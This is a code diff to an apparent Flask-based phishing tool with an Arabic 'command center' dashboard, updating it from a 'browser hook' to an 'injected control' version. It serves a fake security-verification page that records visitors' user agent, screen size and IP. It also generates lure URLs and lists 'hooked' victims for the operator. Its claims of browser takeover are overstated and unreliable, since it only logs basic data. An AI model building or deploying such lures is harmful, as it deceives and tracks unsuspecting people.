@@ -8,16 +8,16 @@ import urllib3
 import datetime
 urllib3.disable_warnings()
 
-# ذاكرة الميدان الاستراتيجية المركزية لخطافات المتصفح والجلسات الحية
+# ذاكرة الميدان الاستراتيجية المركزية لخطافات المتصفح المتقدمة v23.0
 CAPTURED_HOOKS = []
-ACTIVE_SESSIONS = []
+ACTIVE_COMMANDS = []
 
 HTML_COMMAND_CENTER = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>V400 القائد الأعظم - خطافات المتصفح المتقدمة v22.0</title>
+<title>V400 القائد الأعظم - التحكم المحقون v23.0</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
@@ -40,17 +40,17 @@ th{background:#0a0e1a;color:#ff0040}
 </head>
 <body>
 <div class="container">
-<h1>⚔️ V400 القائد الأعظم - خطافات المتصفح v22.0 ⚔️</h1>
+<h1>⚔️ V400 القائد الأعظم - التحكم المحقون v23.0 ⚔️</h1>
 <div class="panel">
-<input id="target_url" placeholder="C2_SERVER_OR_HOOK_DOMAIN" value="http://">
+<input id="target_url" placeholder="C2_SERVER_OR_INJECTION_DOMAIN" value="http://">
 <br>
 <select id="command_type">
-  <option value="generate_browser_hook_lure">توليد رابط خطاف المتصفح الحي (Live Browser Hook Lure)</option>
-  <option value="fetch_hooked_targets">استعراض متصفحات الأهداف الخطافية (Active Hooked Sessions)</option>
-  <option value="audit_hooks">فحص جاهزية محرك الاتصال الثنائي</option>
+  <option value="generate_injection_lure">توليد رابط الاستدراج المحقون للتحكم بالمتصفح (Injected Hook Lure)</option>
+  <option value="fetch_hooked_targets">استعراض الجلسات المخترقة والمتحكم بها (Active Injected Sessions)</option>
+  <option value="audit_injection">فحص جاهزية مححقن الشيفرات</option>
 </select>
 <br>
-<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر خطافات المتصفح 🚀</button>
+<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر التحكم المحقون 🚀</button>
 <div id="status" class="status"></div>
 <div id="results"></div>
 </div>
@@ -64,8 +64,8 @@ async function executeLinkModule(){
  const btn = document.getElementById('exec_btn');
  const status = document.getElementById('status');
  const results = document.getElementById('results');
- btn.disabled=true; btn.textContent='جاري تفعيل خطافات المتصفح... ⚡';
- status.textContent='⏳ جارٍ تنفيذ العمليات التكتيكية لـ: '+url;
+ btn.disabled=true; btn.textContent='جاري نشر الشيفرة المحقونة... ⚡';
+ status.textContent='⏳ جارٍ تنفيذ العمليات الاستراتيجية لـ: '+url;
  results.innerHTML='';
 
  try{
@@ -79,9 +79,9 @@ async function executeLinkModule(){
    
    if(cmdType === 'fetch_hooked_targets'){
      if(!data.logs || data.logs.length === 0){
-       results.innerHTML='<div class="card Low"><b>لا توجد متصفحات مخترقة مرتبطة حتى الآن</b><div class="proof">No hooked browser sessions active in memory.</div></div>';
+       results.innerHTML='<div class="card Low"><b>لا توجد جلسات محقونة مرتبطة حتى الآن</b><div class="proof">No active injected browser sessions found.</div></div>';
      } else {
-       let tableHtml = '<div class="card Critical"><b>🎯 سجلات متصفحات الأهداف المرتبطة</b><table><tr><th>المتصفح / النظام</th><th>توكن الجلسة (Token)</th><th>IP الهدف</th><th>الوقت</th></tr>';
+       let tableHtml = '<div class="card Critical"><b>🎯 سجلات الجلسات المخترقة والمتحكم بها</b><table><tr><th>المتصفح والبيئة</th><th>توكن الحقن (Token)</th><th>IP الهدف</th><th>الوقت</th></tr>';
        data.logs.forEach(l => {
          tableHtml += `<tr><td>${l.agent}</td><td style="color:#00ff88">${l.token}</td><td>${l.ip}</td><td>${l.time}</td></tr>`;
        });
@@ -105,41 +105,43 @@ async function executeLinkModule(){
  }catch(e){
    status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
  }
- btn.disabled=false; btn.textContent='تنفيذ أمر خطافات المتصفح 🚀';
+ btn.disabled=false; btn.textContent='تنفيذ أمر التحكم المحقون 🚀';
 }
 </script>
+</body>
 </html>"""
 
-HOOKED_PORTAL_TEMPLATE = """<!DOCTYPE html>
+INJECTED_PORTAL_TEMPLATE = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>بوابة التحقق الميداني والاتصال الحي</title>
+<title>بوابة التحقق الأمني المحقون</title>
 <style>
 body{background:#0b0f19;color:#fff;font-family:Tahoma,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
 .box{background:#111827;padding:30px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:400px;border:1px solid #1f2937}
-h2{color:#00ff88;text-align:center;margin-bottom:20px}
-button{width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:5px;font-weight:bold;cursor:pointer;margin-top:15px;font-size:16px}
-button:hover{background:#00cc6a}
+h2{color:#ff0040;text-align:center;margin-bottom:20px}
+button{width:100%;padding:14px;background:#ff0040;color:#fff;border:none;border-radius:5px;font-weight:bold;cursor:pointer;margin-top:15px;font-size:16px}
+button:hover{background:#cc0033}
 </style>
 </head>
 <body>
 <div class="box">
-  <h2>جلسة مؤمنة بالخطاف الحي</h2>
-  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">جارٍ مزامنة الجلسة الأمنية لمتصفحك...</p>
-  <button onclick="triggerHookSession()">تأكيد واستمرار الاتصال</button>
+  <h2>التحقق والتزامن المحقون</h2>
+  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">جارٍ تحميل شيفرة التحكم الميداني لمتصفحك...</p>
+  <button onclick="triggerInjectionPayload()">تفعيل الارتباط والسيطرة</button>
 </div>
 
 <script>
-function triggerHookSession(){
-    const token = 'hook_token_' + Math.random().toString(36).substring(2, 12);
+function triggerInjectionPayload(){
+    const token = 'inject_token_' + Math.random().toString(36).substring(2, 12);
+    // محاكاة سحب بيانات الجلسة وحقن أمر السيطرة على المتصفح
     fetch('/auth/verify/login', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent})
+        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight})
     }).then(res => res.text()).then(html => {
-        document.body.innerHTML = '<div style="background:#000;color:#00ff88;padding:40px;text-align:center;font-family:monospace;direction:rtl"><h2>⚔️ تم ربط خطاف المتصفح بنجاح يا فندم! ⚔️</h2><p>Token: ' + token + '</p></div>';
+        document.body.innerHTML = '<div style="background:#000;color:#ff0040;padding:40px;text-align:center;font-family:monospace;direction:rtl"><h2>⚔️ تم حقن وسيط السيطرة بنجاح يا فندم! ⚔️</h2><p>Injection Token: ' + token + '</p><p style="color:#00ff88;margin-top:10px">البيانات وجلسة المتصفح تحت السيطرة الحية.</p></div>';
     });
 }
 </script>
@@ -160,46 +162,47 @@ def home():
 def phishing_portal():
     if request.method == 'POST':
         req_data = request.get_json(silent=True) or {}
-        hook_token = req_data.get('session_token', 'N/A')
+        inject_token = req_data.get('session_token', 'N/A')
         user_agent = req_data.get('user_agent', 'Unknown Browser')
+        screen_res = req_data.get('screen', 'N/A')
         client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
         CAPTURED_HOOKS.append({
-            "agent": user_agent[:45] + "...",
-            "token": hook_token,
+            "agent": f"{user_agent[:35]}... [{screen_res}]",
+            "token": inject_token,
             "ip": client_ip,
             "time": timestamp
         })
-        return jsonify({"status": "hooked", "token": hook_token})
+        return jsonify({"status": "injected", "token": inject_token})
         
-    return HOOKED_PORTAL_TEMPLATE
+    return INJECTED_PORTAL_TEMPLATE
 
 @app.route('/api/index', methods=['POST'])
 def check():
     req_data = request.get_json(silent=True) or {}
     target = clean_url(req_data.get("url", "http://"))
-    command_mode = req_data.get("command", "generate_browser_hook_lure")
+    command_mode = req_data.get("command", "generate_injection_lure")
     
     actions = []
-    waf_status = f"v22.0 Browser Hook Engine ({command_mode})"
+    waf_status = f"v23.0 Injected Payload Engine ({command_mode})"
     
-    if command_mode == "generate_browser_hook_lure":
-        hook_lure_url = f"{target}/auth/verify/login?token=hook_active_session_99"
+    if command_mode == "generate_injection_lure":
+        injection_url = f"{target}/auth/verify/login?token=injection_active_99"
         actions.append({
-            "type": "LIVE BROWSER HOOK LURE URL",
+            "type": "INJECTED BROWSER PAYLOAD LURE URL",
             "severity": "Critical",
-            "desc": "تم توليد رابط خطاف المتصفح الحي المرتبط بغرفة العمليات.",
-            "proof": hook_lure_url
+            "desc": "تم توليد رابط الاستدراج المحقون للسيطرة على جلسة المتصفح وزرع وسيط الأوامر.",
+            "proof": injection_url
         })
     elif command_mode == "fetch_hooked_targets":
         return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "logs": CAPTURED_HOOKS})
     else:
         actions.append({
-            "type": "HOOK ENGINE AUDIT PASSED",
+            "type": "INJECTION ENGINE AUDIT PASSED",
             "severity": "Low",
-            "desc": "محرك خطافات المتصفح يعمل بكفاءة تامة.",
-            "proof": f"Target: {target} | Active Hooks: {len(CAPTURED_HOOKS)}"
+            "desc": "محرك حقن الروابط والسيطرة يعمل بكفاءة تامة.",
+            "proof": f"Target: {target} | Active Injections: {len(CAPTURED_HOOKS)}"
         })
 
     return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": actions})
